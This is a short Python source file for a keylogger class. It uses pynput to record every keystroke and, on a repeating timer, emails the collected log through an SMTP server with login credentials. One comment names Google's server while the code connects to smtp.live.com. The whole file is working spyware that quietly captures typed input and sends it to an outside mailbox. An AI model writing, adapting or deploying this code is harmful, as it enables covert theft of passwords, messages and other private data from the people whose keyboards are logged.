import pynput.keyboard
import threading
import smtplib

class Keylogger:

    def __init__(self, interval, email, password):
        self.log = "\nKeylogger started\n"
        self.interval = interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_keystrike(self, key):

        try: # for letters and digits

            current_key = str(key.char)

        except AttributeError: # for special characters

            if key == key.space: # print spaces nicely
                current_key = " "

            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)

    def report(self):

        self.send_mail(self.email, self.password, self.log)
        self.log = "" + "\n"  # reset the log after sending email

        # create a timer to run on a separate thread after x seconds.
        # recursion is used, so the report function will be called again after x seconds
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):

        # creates an SMTP server instance. use google's smtp server which runs on port 587
        server = smtplib.SMTP("smtp.live.com", 587)

        server.starttls() # start the server

        server.login(email, password) # log in into email with the given email and pw

        server.sendmail(email, email, message) # send the email to ourself

        server.quit()

    def start(self):

        # create an instance of the listener object for keyboard, with a callback function
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_keystrike)

        # start the keyboard listener and the report thread
        with keyboard_listener:

            # use threading to make sure both the report function and listener don't block each other
            self.report()
            keyboard_listener.join()